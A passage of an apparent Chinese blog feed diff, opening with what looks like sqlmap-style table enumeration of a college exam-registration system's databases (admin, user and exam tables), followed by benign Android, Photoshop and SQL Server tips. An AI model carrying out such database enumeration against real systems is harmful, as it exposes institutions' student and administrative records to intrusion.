+| CollegeForeignLanguageTest102.v_yyjb_sd     |
+| CollegeForeignLanguageTest111.b_kkyyjb      |
+| CollegeForeignLanguageTest111.bp_jd         |
+| CollegeForeignLanguageTest111.d_accept      |
+| CollegeForeignLanguageTest111.t_ks_modify   |
+| CollegeForeignLanguageTest111.v_bmcount2_sd |
+| CollegeForeignLanguageTest111.v_bmcount2_sd |
+| CollegeForeignLanguageTest111.v_bmcount_sd  |
+| CollegeForeignLanguageTest111.v_bmcount_sd  |
+| CollegeForeignLanguageTest111.v_bpcount2_sd |
+| CollegeForeignLanguageTest111.v_bpcount2_sd |
+| CollegeForeignLanguageTest111.v_bpcount_sd  |
+| CollegeForeignLanguageTest111.v_bpcount_sd  |
+| CollegeForeignLanguageTest111.v_jtbm_sd     |
+| CollegeForeignLanguageTest111.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest111.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest111.v_ks_sd       |
+| CollegeForeignLanguageTest111.v_tj_bkrs     |
+| CollegeForeignLanguageTest111.v_yyjb_sd     |
+| CollegeForeignLanguageTest112.a_bj          |
+| CollegeForeignLanguageTest112.a_xy          |
+| CollegeForeignLanguageTest112.a_zy          |
+| CollegeForeignLanguageTest112.b_kkyyjb      |
+| CollegeForeignLanguageTest112.bp_jd         |
+| CollegeForeignLanguageTest112.d_accept      |
+| CollegeForeignLanguageTest112.t_ks_modify   |
+| CollegeForeignLanguageTest112.t_ks_modify   |
+| CollegeForeignLanguageTest112.v_bmcount2_sd |
+| CollegeForeignLanguageTest112.v_bmcount2_sd |
+| CollegeForeignLanguageTest112.v_bmcount_sd  |
+| CollegeForeignLanguageTest112.v_bmcount_sd  |
+| CollegeForeignLanguageTest112.v_bpcount2_sd |
+| CollegeForeignLanguageTest112.v_bpcount2_sd |
+| CollegeForeignLanguageTest112.v_bpcount_sd  |
+| CollegeForeignLanguageTest112.v_bpcount_sd  |
+| CollegeForeignLanguageTest112.v_jtbm_sd     |
+| CollegeForeignLanguageTest112.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest112.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest112.v_ks_sd       |
+| CollegeForeignLanguageTest112.v_tj_bkrs     |
+| CollegeForeignLanguageTest112.v_yyjb_sd     |
+| CollegeForeignLanguageTest121.a_bj          |
+| CollegeForeignLanguageTest121.a_xy          |
+| CollegeForeignLanguageTest121.a_zy          |
+| CollegeForeignLanguageTest121.b_kkyyjb      |
+| CollegeForeignLanguageTest121.bp_jd         |
+| CollegeForeignLanguageTest121.d_accept      |
+| CollegeForeignLanguageTest121.t_ks_modify   |
+| CollegeForeignLanguageTest121.t_ks_modify   |
+| CollegeForeignLanguageTest121.v_bmcount2_sd |
+| CollegeForeignLanguageTest121.v_bmcount2_sd |
+| CollegeForeignLanguageTest121.v_bmcount_sd  |
+| CollegeForeignLanguageTest121.v_bmcount_sd  |
+| CollegeForeignLanguageTest121.v_bpcount2_sd |
+| CollegeForeignLanguageTest121.v_bpcount2_sd |
+| CollegeForeignLanguageTest121.v_bpcount_sd  |
+| CollegeForeignLanguageTest121.v_bpcount_sd  |
+| CollegeForeignLanguageTest121.v_jtbm_sd     |
+| CollegeForeignLanguageTest121.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest121.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest121.v_ks_sd       |
+| CollegeForeignLanguageTest121.v_tj_bkrs     |
+| CollegeForeignLanguageTest121.v_yyjb_sd     |
+| CollegeForeignLanguageTest122.a_bj          |
+| CollegeForeignLanguageTest122.a_xy          |
+| CollegeForeignLanguageTest122.a_zy          |
+| CollegeForeignLanguageTest122.b_kkyyjb      |
+| CollegeForeignLanguageTest122.bp_jd         |
+| CollegeForeignLanguageTest122.d_accept      |
+| CollegeForeignLanguageTest122.t_ks_modify   |
+| CollegeForeignLanguageTest122.t_ks_modify   |
+| CollegeForeignLanguageTest122.v_bmcount2_sd |
+| CollegeForeignLanguageTest122.v_bmcount2_sd |
+| CollegeForeignLanguageTest122.v_bmcount_sd  |
+| CollegeForeignLanguageTest122.v_bmcount_sd  |
+| CollegeForeignLanguageTest122.v_bpcount2_sd |
+| CollegeForeignLanguageTest122.v_bpcount2_sd |
+| CollegeForeignLanguageTest122.v_bpcount_sd  |
+| CollegeForeignLanguageTest122.v_bpcount_sd  |
+| CollegeForeignLanguageTest122.v_jtbm_sd     |
+| CollegeForeignLanguageTest122.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest122.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest122.v_ks_sd       |
+| CollegeForeignLanguageTest122.v_tj_bkrs     |
+| CollegeForeignLanguageTest122.v_yyjb_sd     |
+| CollegeForeignLanguageTest131.a_bj          |
+| CollegeForeignLanguageTest131.a_xy          |
+| CollegeForeignLanguageTest131.a_zy          |
+| CollegeForeignLanguageTest131.b_kkyyjb      |
+| CollegeForeignLanguageTest131.bp_jd         |
+| CollegeForeignLanguageTest131.d_accept      |
+| CollegeForeignLanguageTest131.t_ks_modify   |
+| CollegeForeignLanguageTest131.t_ks_modify   |
+| CollegeForeignLanguageTest131.v_bmcount2_sd |
+| CollegeForeignLanguageTest131.v_bmcount2_sd |
+| CollegeForeignLanguageTest131.v_bmcount_sd  |
+| CollegeForeignLanguageTest131.v_bmcount_sd  |
+| CollegeForeignLanguageTest131.v_bpcount2_sd |
+| CollegeForeignLanguageTest131.v_bpcount2_sd |
+| CollegeForeignLanguageTest131.v_bpcount_sd  |
+| CollegeForeignLanguageTest131.v_bpcount_sd  |
+| CollegeForeignLanguageTest131.v_jtbm_sd     |
+| CollegeForeignLanguageTest131.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest131.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest131.v_ks_sd       |
+| CollegeForeignLanguageTest131.v_tj_bkrs     |
+| CollegeForeignLanguageTest131.v_yyjb_sd     |
+| CollegeForeignLanguageTest132.a_bj          |
+| CollegeForeignLanguageTest132.a_xy          |
+| CollegeForeignLanguageTest132.a_zy          |
+| CollegeForeignLanguageTest132.b_kkyyjb      |
+| CollegeForeignLanguageTest132.bp_jd         |
+| CollegeForeignLanguageTest132.d_accept      |
+| CollegeForeignLanguageTest132.t_ks_modify   |
+| CollegeForeignLanguageTest132.t_ks_modify   |
+| CollegeForeignLanguageTest132.v_bmcount2_sd |
+| CollegeForeignLanguageTest132.v_bmcount2_sd |
+| CollegeForeignLanguageTest132.v_bmcount_sd  |
+| CollegeForeignLanguageTest132.v_bmcount_sd  |
+| CollegeForeignLanguageTest132.v_bpcount2_sd |
+| CollegeForeignLanguageTest132.v_bpcount2_sd |
+| CollegeForeignLanguageTest132.v_bpcount_sd  |
+| CollegeForeignLanguageTest132.v_bpcount_sd  |
+| CollegeForeignLanguageTest132.v_jtbm_sd     |
+| CollegeForeignLanguageTest132.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest132.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest132.v_ks_sd       |
+| CollegeForeignLanguageTest132.v_tj_bkrs     |
+| CollegeForeignLanguageTest132.v_yyjb_sd     |
+| CollegeForeignLanguageTest141.a_bj          |
+| CollegeForeignLanguageTest141.a_xy          |
+| CollegeForeignLanguageTest141.a_zy          |
+| CollegeForeignLanguageTest141.b_kkyyjb      |
+| CollegeForeignLanguageTest141.bp_jd         |
+| CollegeForeignLanguageTest141.d_accept      |
+| CollegeForeignLanguageTest141.t_ks_modify   |
+| CollegeForeignLanguageTest141.t_ks_modify   |
+| CollegeForeignLanguageTest141.v_bmcount2_sd |
+| CollegeForeignLanguageTest141.v_bmcount2_sd |
+| CollegeForeignLanguageTest141.v_bmcount_sd  |
+| CollegeForeignLanguageTest141.v_bmcount_sd  |
+| CollegeForeignLanguageTest141.v_bpcount2_sd |
+| CollegeForeignLanguageTest141.v_bpcount2_sd |
+| CollegeForeignLanguageTest141.v_bpcount_sd  |
+| CollegeForeignLanguageTest141.v_bpcount_sd  |
+| CollegeForeignLanguageTest141.v_jtbm_sd     |
+| CollegeForeignLanguageTest141.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest141.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest141.v_ks_sd       |
+| CollegeForeignLanguageTest141.v_tj_bkrs     |
+| CollegeForeignLanguageTest141.v_yyjb_sd     |
+| CollegeForeignLanguageTest142.a_bj          |
+| CollegeForeignLanguageTest142.a_xy          |
+| CollegeForeignLanguageTest142.a_zy          |
+| CollegeForeignLanguageTest142.b_kkyyjb      |
+| CollegeForeignLanguageTest142.bp_jd         |
+| CollegeForeignLanguageTest142.d_accept      |
+| CollegeForeignLanguageTest142.t_ks_modify   |
+| CollegeForeignLanguageTest142.t_ks_modify   |
+| CollegeForeignLanguageTest142.v_bmcount2_sd |
+| CollegeForeignLanguageTest142.v_bmcount2_sd |
+| CollegeForeignLanguageTest142.v_bmcount_sd  |
+| CollegeForeignLanguageTest142.v_bmcount_sd  |
+| CollegeForeignLanguageTest142.v_bpcount2_sd |
+| CollegeForeignLanguageTest142.v_bpcount2_sd |
+| CollegeForeignLanguageTest142.v_bpcount_sd  |
+| CollegeForeignLanguageTest142.v_bpcount_sd  |
+| CollegeForeignLanguageTest142.v_jtbm_sd     |
+| CollegeForeignLanguageTest142.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest142.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest142.v_ks_sd       |
+| CollegeForeignLanguageTest142.v_tj_bkrs     |
+| CollegeForeignLanguageTest142.v_yyjb_sd     |
+| CollegeForeignLanguageTest151.a_bj          |
+| CollegeForeignLanguageTest151.a_xy          |
+| CollegeForeignLanguageTest151.a_zy          |
+| CollegeForeignLanguageTest151.b_kkyyjb      |
+| CollegeForeignLanguageTest151.bp_jd         |
+| CollegeForeignLanguageTest151.d_accept      |
+| CollegeForeignLanguageTest151.t_ks_modify   |
+| CollegeForeignLanguageTest151.t_ks_modify   |
+| CollegeForeignLanguageTest151.v_bmcount2_sd |
+| CollegeForeignLanguageTest151.v_bmcount2_sd |
+| CollegeForeignLanguageTest151.v_bmcount_sd  |
+| CollegeForeignLanguageTest151.v_bmcount_sd  |
+| CollegeForeignLanguageTest151.v_bpcount2_sd |
+| CollegeForeignLanguageTest151.v_bpcount2_sd |
+| CollegeForeignLanguageTest151.v_bpcount_sd  |
+| CollegeForeignLanguageTest151.v_bpcount_sd  |
+| CollegeForeignLanguageTest151.v_jtbm_sd     |
+| CollegeForeignLanguageTest151.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest151.v_kkyyjb_sd   |
+| CollegeForeignLanguageTest151.v_ks_sd       |
+| CollegeForeignLanguageTest151.v_tj_bkrs     |
+| CollegeForeignLanguageTest151.v_yyjb_sd     |
+| Dict                                        |
+| LogDel                                      |
+| LogExport                                   |
+| LogImport                                   |
+| LogMsg                                      |
+| a_bj                                        |
+| a_fg                                        |
+| a_sex                                       |
+| a_sf                                        |
+| a_xq_sd                                     |
+| a_xq_sd                                     |
+| a_xx                                        |
+| a_xy                                        |
+| a_zy                                        |
+| b_jkls                                      |
+| b_kcwz                                      |
+| b_user                                      |
+| b_xl                                        |
+| b_yyjb                                      |
+| b_zjlx                                      |
+| books_cet46                                 |
+| checkdata                                   |
+| d_jtbm                                      |
+| d_txl                                       |
+| dtproperties                                |
+| qk                                          |
+| stu$                                        |
+| sysconstraints                              |
+| syssegments                                 |
+| t_ks_archives                               |
+| t_ks_modify_center                          |
+| temp0403                                    |
+| temp2015_04_01                              |
+| tempcet6qxmd                                |
+| tempjf                                      |
+| viewPrintInfoNew                            |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: djks
+[110 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| DragonV_BM                                  |
+| DragonV_CJ                                  |
+| DragonV_PrintInfo                           |
+| Dragon_AdminUser                            |
+| Dragon_BM01                                 |
+| Dragon_BM02                                 |
+| Dragon_BM34$                                |
+| Dragon_BM34$                                |
+| Dragon_BM35                                 |
+| Dragon_BM36                                 |
+| Dragon_BM37new                              |
+| Dragon_BM37new                              |
+| Dragon_BM37old                              |
+| Dragon_BM_Save                              |
+| Dragon_BM_md5                               |
+| Dragon_BM_md5                               |
+| Dragon_CJ_Save                              |
+| Dragon_CJ_Save                              |
+| Dragon_CR                                   |
+| Dragon_News                                 |
+| Dragon_NonSchoolStu                         |
+| Dragon_Students                             |
+| T_cardlist                                  |
+| Tc_Blcj_bak                                 |
+| Tc_Blcj_bak                                 |
+| Tc_Cjdj_bak                                 |
+| Tc_Cjdj_bak                                 |
+| Tc_JBYY1                                    |
+| Tc_Mz_bak                                   |
+| Tc_Mz_bak                                   |
+| Tc_Pxzl_bak                                 |
+| Tc_Pxzl_bak                                 |
+| Tc_Sjqk_bak                                 |
+| Tc_Sjqk_bak                                 |
+| Tc_Whcd_bak                                 |
+| Tc_Whcd_bak                                 |
+| Tc_Wjcf_bak                                 |
+| Tc_Wjcf_bak                                 |
+| Tc_Xb_bak                                   |
+| Tc_Xb_bak                                   |
+| Tc_Zy_bak                                   |
+| Tc_Zy_bak                                   |
+| allstu2012                                  |
+| dtproperties                                |
+| k33cj                                       |
+| k35cj                                       |
+| ncre36                                      |
+| sysconstraints                              |
+| syssegments                                 |
+| t_basicedit_bak                             |
+| t_basicedit_bak                             |
+| t_bm                                        |
+| t_bshhkc                                    |
+| t_bskcsy                                    |
+| t_cardcontent                               |
+| t_cj                                        |
+| t_cw                                        |
+| t_cwsbbz                                    |
+| t_dict                                      |
+| t_edittype_bak                              |
+| t_edittype_bak                              |
+| t_functions                                 |
+| t_jsmd                                      |
+| t_kcxx                                      |
+| t_kdxx                                      |
+| t_ksda                                      |
+| t_kswj                                      |
+| t_omr                                       |
+| t_scbjg                                     |
+| t_setting                                   |
+| t_sjkcqk                                    |
+| t_sjkcsy                                    |
+| t_sjkcwz                                    |
+| t_sjsq                                      |
+| t_sjxtsj                                    |
+| t_usergroups                                |
+| t_useringroups                              |
+| t_users                                     |
+| t_version                                   |
+| t_zkzbak_kd                                 |
+| t_zkzbak_ks                                 |
+| tc_jbyy_bak                                 |
+| tc_jbyy_bak                                 |
+| tc_kdqk_bak                                 |
+| tc_kdqk_bak                                 |
+| tc_kqdm_bak                                 |
+| tc_kqdm_bak                                 |
+| temp20141218                                |
+| temp_Dragon_BM1                             |
+| temp_Dragon_BM1                             |
+| temp_cjb                                    |
+| temp_jfstu                                  |
+| temp_mdnew1                                 |
+| temp_mdnew1                                 |
+| temp_mdold                                  |
+| temp_ncrejf                                 |
+| temp_njf                                    |
+| temp_nopay                                  |
+| temp_pay_ncre39                             |
+| tempcj34                                    |
+| v_allbsbpkc                                 |
+| v_bm_checkyyjb                              |
+| v_bsbpkc                                    |
+| v_bskc                                      |
+| v_dsjg                                      |
+| v_hhkcrs                                    |
+| v_kdjg                                      |
+| v_ksxx                                      |
+| v_sjbpkc                                    |
+| v_ssjg                                      |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+
+<p>Database: exam
+[17 tables]
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+
+| PaperList                                   |
+| TaskList                                    |
+| dtproperties                                |
+| exam_paperlib_Save                          |
+| exam_paperlib_Save                          |
+| exam_score_save                             |
+| exam_score_save                             |
+| exam_users                                  |
+| sysconstraints                              |
+| syssegments                                 |
+| v_answercount                               |
+| v_exam_paperlist                            |
+| v_exam_score_detail                         |
+| v_exam_score_detail                         |
+| v_examstudents                              |
+| v_finishtask                                |
+| v_scorestat                                 |
++&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;&mdash;+</p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[把图片P成圆形]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/06/06/ps_circle_markdown/"/>
+    <updated>2015-06-06T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/06/06/ps_circle_markdown</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<p>图书馆老师叫我把图书馆app的logo设置一下- -&hellip;&hellip;额&hellip;..额&hellip;..我只有在网上找图,,然后P成圆形 效果还OK - -..</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-06-06-01.png" alt="效果图" /></p>
+
+<h3>0x00 用圆形框住所需部分</h3>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-06-06-02.png" alt="圆形取内容" /></p>
+
+<h3>0x01 调节背景色为黑色</h3>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-06-06-03.png" alt="调节背景色" /></p>
+
+<h3>0x02 添加矢量蒙版</h3>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-06-06-04.png" alt="添加矢量蒙版" /></p>
+
+<h3>参考链接</h3>
+
+<p><a href="http://jingyan.baidu.com/article/c275f6bac3da2de33d75672c.html">http://jingyan.baidu.com/article/c275f6bac3da2de33d75672c.html</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Android_image_indicator]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/06/03/android_image_indicator/"/>
+    <updated>2015-06-03T00:00:00+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/06/03/android_image_indicator</id>
+    <content type="html"><![CDATA[<p><a href="https://github.com/panxw/android-image-indicator">https://github.com/panxw/android-image-indicator</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Android中ImageView的scaleType属性]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/24/imageview_scaleType/"/>
+    <updated>2015-05-24T08:22:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/24/imageview_scaleType</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>0x00思路</h3>
+
+<p>我的目标是在任何尺寸的屏幕下 都按3分之一显示图片,然后3分之二显示其他内容.然而imagesview的scaleType属性有9种:matrix、fitXY、fitStart、fitCenter、fitEnd、center、centerCrop、centerInside.第九种就是没写这个属性.</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-24-01.png" alt="原图片" /></p>
+
+<h3>0x01基本代码</h3>
+
+<pre><code>&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+xmlns:tools="http://schemas.android.com/tools"
+android:layout_width="match_parent"
+android:layout_height="match_parent"
+android:orientation="vertical"
+tools:context="com.tjrac.MainActivity" &gt;
+
+&lt;LinearLayout
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:layout_weight="2"
+    android:orientation="vertical" &gt;
+
+    &lt;ImageView
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:contentDescription="@string/text"
+        android:scaleType="centerInside"
+        android:src="@drawable/sy_scroll_1" /&gt;
+&lt;/LinearLayout&gt;
+
+&lt;LinearLayout
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:layout_weight="1" &gt;
+
+    &lt;TextView
+        android:layout_width="match_parent"
+        android:layout_height="match_parent"
+        android:text="@string/text" /&gt;
+&lt;/LinearLayout&gt;
+
+&lt;/LinearLayout&gt;
+</code></pre>
+
+<p>然而matrix的的显示效果为</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-24-02.png" alt="matrix" /></p>
+
+<p>fitXY的的显示效果为</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-24-03.png" alt="fitXY" /></p>
+
+<p>fitStart的的显示效果为</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-24-04.png" alt="fitStart" /></p>
+
+<p>fitCenter的的显示效果为</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-24-05.png" alt="fitCenter" /></p>
+
+<p>fitEnd的的显示效果为</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-24-06.png" alt="fitEnd" /></p>
+
+<p>center的的显示效果为</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-24-07.png" alt="center" /></p>
+
+<p>centerCrop的的显示效果为</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-24-08.png" alt="centerCrop" /></p>
+
+<p>centerInside的的显示效果为</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-24-09.png" alt="centerInside" /></p>
+
+<p>不设置的的显示效果为</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-24-10.png" alt="不设置" /></p>
+
+<h3>参考链接</h3>
+
+<p><a href="http://www.chenyunchao.com/?p=189">http://www.chenyunchao.com/?p=189</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[Tjrac_library_icon]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/24/tjrac_library_icon/"/>
+    <updated>2015-05-24T00:00:00+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/24/tjrac_library_icon</id>
+    <content type="html"><![CDATA[<p>icon图标寻找网址</p>
+
+<p>未还书籍
+<a href="https://www.iconfinder.com/icons/464755/book_girl_reading_studying_icon#size=128">https://www.iconfinder.com/icons/464755/book_girl_reading_studying_icon#size=128</a></p>
+
+<p>借阅历史
+<a href="https://www.iconfinder.com/icons/418150/books_man_holding_book_student_student_holding_books_teacher_holding_books_icon#size=64">https://www.iconfinder.com/icons/418150/books_man_holding_book_student_student_holding_books_teacher_holding_books_icon#size=64</a></p>
+
+<p>个人资料
+<a href="https://www.iconfinder.com/icons/110540/book_user_icon#size=64">https://www.iconfinder.com/icons/110540/book_user_icon#size=64</a>
+<a href="https://www.iconfinder.com/icons/539941/book_education_learning_reading_school_student_study_icon#size=64">https://www.iconfinder.com/icons/539941/book_education_learning_reading_school_student_study_icon#size=64</a></p>
+
+<p>查找书籍
+<a href="https://www.iconfinder.com/icons/392557/book_ebook_in_search_text_icon#size=64">https://www.iconfinder.com/icons/392557/book_ebook_in_search_text_icon#size=64</a></p>
+
+<p>荐购
+<a href="https://www.iconfinder.com/icons/481691/book_online_book_online_book_store_online_library_pointing_swiping_tablet_icon#size=64">https://www.iconfinder.com/icons/481691/book_online_book_online_book_store_online_library_pointing_swiping_tablet_icon#size=64</a></p>
+
+<p>挂失
+<a href="https://www.iconfinder.com/icons/391599/account_id_card_identification_identity_pass_passport_profile_icon#size=64">https://www.iconfinder.com/icons/391599/account_id_card_identification_identity_pass_passport_profile_icon#size=64</a>
+<a href="https://www.iconfinder.com/icons/434534/card_driver%27s_drivers_id_identification_identity_license_icon#size=64">https://www.iconfinder.com/icons/434534/card_driver%27s_drivers_id_identification_identity_license_icon#size=64</a></p>
+
+<p>违章
+<a href="https://www.iconfinder.com/icons/338804/alarm_alert_attention_beat_brute_force_caution_crime_criminal_damage_danger_exclamation_fist_forcing_guard_hazard_mafia_military_mug_murder_police_problem_protection_risk_rob_robber_robbery_safe_safety_siren_strike_struggle_thief_violate_violation_warning_icon#size=64">https://www.iconfinder.com/icons/338804/alarm_alert_attention_beat_brute_force_caution_crime_criminal_damage_danger_exclamation_fist_forcing_guard_hazard_mafia_military_mug_murder_police_problem_protection_risk_rob_robber_robbery_safe_safety_siren_strike_struggle_thief_violate_violation_warning_icon#size=64</a>
+<a href="https://www.iconfinder.com/icons/548471/%24_currency_dollar_dollars_money_peso_sign_icon#size=64">https://www.iconfinder.com/icons/548471/%24_currency_dollar_dollars_money_peso_sign_icon#size=64</a></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[sql server 简单问题集合]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/21/sqlserver_question/"/>
+    <updated>2015-05-21T08:22:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/21/sqlserver_question</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>忘记sa账号密码</h3>
+
+<p>用windows验证登陆进去执行</p>
+
+<pre><code>EXEC sp_password NULL,'Newpassword','sa'
+</code></pre>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[ListView与Adapter简单试用]]></title>
+    <link href="http://mzkmzk.github.io/blog/2015/05/18/listview_adapter/"/>
+    <updated>2015-05-18T11:37:40+08:00</updated>
+    <id>http://mzkmzk.github.io/blog/2015/05/18/listview_adapter</id>
+    <content type="html"><![CDATA[<!--more-->
+
+
+<h3>0x00 概述</h3>
+
+<p>在android项目中,有很多时候要用到列表,这时listview和adapter
+就能满足你的需求,基本的</p>
+
+<ol>
+<li>创建总布局文件</li>
+<li>创建listview_item即每一行要显示的布局文件</li>
+<li>创建adapter类</li>
+<li>创建activity类将数据放进adapter中</li>
+</ol>
+
+
+<p>这里是完成后的效果图</p>
+
+<p><img src="http://mzkmzk.github.io/images/blog/2015-05-18-01.png" alt="image" /></p>
+
+<h3>0x01 创建总布局文件 activity_jiansuo.xml</h3>
+
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+android:layout_width="match_parent"
+android:layout_height="match_parent"
+android:orientation="vertical" &gt;
+
+&lt;EditText
+    android:id="@+id/et_jiansuo"
+    android:layout_width="fill_parent"
+    android:layout_height="wrap_content"
+    android:text="搜索内容" /&gt;
+
+&lt;Button
+    android:id="@+id/bt_jiansuo"
+    android:layout_width="fill_parent"
+    android:layout_height="wrap_content"
+    android:text="搜索" /&gt;
+
+&lt;ListView
+    android:id="@+id/lv_jiansuo"
+    android:layout_width="fill_parent"
+    android:layout_height="wrap_content" /&gt;
+
+&lt;/LinearLayout&gt;
+</code></pre>
+
+<h3>0x02 创建listview_item即每一行要显示的布局文件 activity_jiansuo_item.xml</h3>
+
+<pre><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
+&lt;LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
+android:layout_width="match_parent"
+android:layout_height="match_parent"
+android:orientation="vertical" &gt;
+
+&lt;TextView
+    android:id="@+id/tv_m_title"
+    android:layout_width="wrap_content"
+    android:layout_height="wrap_content" /&gt;
+
+&lt;TextView
+    android:id="@+id/tv_call_no"
+    android:layout_width="wrap_content"
+    android:layout_height="wrap_content" /&gt;
+
+&lt;TextView
+    android:id="@+id/tv_guanchang"
+    android:layout_width="wrap_content"
+    android:layout_height="wrap_content" /&gt;
+
+&lt;TextView
+    android:id="@+id/tv_kejie"
+    android:layout_width="wrap_content"
+    android:layout_height="wrap_content" /&gt;
+
+&lt;TextView
+    android:id="@+id/tv_m_author"
+    android:layout_width="wrap_content"
+    android:layout_height="wrap_content" /&gt;
+
+&lt;TextView
+    android:id="@+id/tv_m_publisher"
+    android:layout_width="wrap_content"
+    android:layout_height="wrap_content" /&gt;
+
+&lt;TextView
+    android:id="@+id/tv_m_year"
+    android:layout_width="wrap_content"
+    android:layout_height="wrap_content" /&gt;
+
+&lt;/LinearLayout&gt;
+</code></pre>
+
+<h3>0x03 创建adapter类</h3>
+
+<pre><code>import gabriel.luoyer.promonkey.R;
+import gabriel.luoyer.promonkey.bean.LIB.LIB_book;
+
+import java.util.List;
+
+import android.content.Context;
+import android.view.LayoutInflater;
+import android.view.View;
+import android.view.ViewGroup;
+import android.widget.BaseAdapter;
+import android.widget.TextView;
+
+public class JianSuo_Adapter extends BaseAdapter {
+
+private Context context; // 运行上下文
+private List&lt;LIB_book&gt; listItems; // 商品信息集合
+private LayoutInflater listContainer; // 视图容器
+
+public final class ListItemView {
+    public TextView tv_m_title;
+    public TextView tv_call_no;
+    public TextView tv_guanchang;
+    public TextView tv_kejie;
+    public TextView tv_m_author;
+    public TextView tv_m_publisher;
+    public TextView tv_m_year;
+}
+
+public JianSuo_Adapter(Context context, List&lt;LIB_book&gt; listItems) {
+    this.context = context;
+    this.listItems = listItems;
+    listContainer = LayoutInflater.from(context); // 创建视图容器并设置上下文
+}
+
+@Override
+public int getCount() {
+    return listItems.size();
+}
+
+@Override
+public LIB_book getItem(int position) {
+    return listItems.get(position);
+}
+
+@Override
+public long getItemId(int position) {
+    return position;
+}
+
+@Override
+public View getView(int position, View convertView, ViewGroup parent) {
+    ListItemView listItemView = null;
+    if (convertView == null) {
+        listItemView = new ListItemView();
+        convertView = listContainer.inflate(R.layout.activity_jiansuo_item, null);
+        listItemView.tv_m_title=(TextView)convertView.findViewById(R.id.tv_m_title);
+        listItemView.tv_call_no=(TextView)convertView.findViewById(R.id.tv_call_no);
+        listItemView.tv_guanchang=(TextView)convertView.findViewById(R.id.tv_guanchang);
+        listItemView.tv_kejie=(TextView)convertView.findViewById(R.id.tv_kejie);
+        listItemView.tv_m_author=(TextView)convertView.findViewById(R.id.tv_m_author);
+        listItemView.tv_m_publisher=(TextView)convertView.findViewById(R.id.tv_m_publisher);
+        listItemView.tv_m_year=(TextView)convertView.findViewById(R.id.tv_m_year);
+        //设置控件集到convertView  
+        convertView.setTag(listItemView);
+    }else{
+          listItemView = (ListItemView)convertView.getTag();  
+    }
+    listItemView.tv_m_title.setText(listItems.get(position).getM_TITLE());
+    listItemView.tv_call_no.setText(listItems.get(position).getCALL_NO());
+    listItemView.tv_guanchang.setText(listItems.get(position).getGuanChang());
+    listItemView.tv_kejie.setText(listItems.get(position).getKeJie());
+    listItemView.tv_m_author.setText(listItems.get(position).getM_AUTHOR());
+    listItemView.tv_m_publisher.setText(listItems.get(position)
